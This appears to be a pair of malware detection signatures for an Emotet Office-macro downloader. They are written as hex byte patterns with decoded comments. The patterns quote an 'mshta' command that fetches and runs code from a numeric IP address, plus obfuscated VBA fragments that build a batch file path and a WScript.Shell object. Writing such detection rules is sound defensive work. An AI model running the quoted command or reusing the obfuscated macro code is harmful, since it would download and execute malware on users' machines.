
rule TrojanDownloader_O97M_Emotet_BOP_MTB{
	meta:
		description = "TrojanDownloader:O97M/Emotet.BOP!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {46 46 20 3d 20 22 6d 73 68 74 61 20 68 74 74 70 3a 2f 2f 39 31 2e 32 34 30 2e 31 31 38 2e 31 37 32 2f 73 73 2f 68 68 2e 68 74 6d 6c 22 } //1 FF = "mshta http://91.240.118.172/ss/hh.html"
	condition:
		((#a_01_0  & 1)*1) >=1
 
}
rule TrojanDownloader_O97M_Emotet_BOP_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Emotet.BOP!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 52 70 63 65 72 65 52 70 63 65 70 6c 61 52 70 63 65 63 65 28 22 47 73 77 65 63 3a 47 73 77 65 5c 70 47 73 77 65 72 6f 47 73 77 65 67 72 61 6d 47 73 77 65 64 61 47 73 77 65 74 47 73 77 65 61 5c 6a 6c 65 64 73 68 66 2e 62 47 73 77 65 61 74 22 2c 22 47 73 77 65 22 2c 22 22 } //1 =RpcereRpceplaRpcece("Gswec:Gswe\pGsweroGswegramGswedaGswetGswea\jledshf.bGsweat","Gswe",""
		$a_01_1 = {3d 77 73 52 70 63 65 43 72 69 50 52 70 63 65 74 2e 63 72 65 52 70 63 65 41 74 65 6f 62 52 70 63 65 4a 45 63 74 28 72 65 52 70 63 65 70 6c 61 52 70 63 65 63 65 28 22 } //1 =wsRpceCriPRpcet.creRpceAteobRpceJEct(reRpceplaRpcece("
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}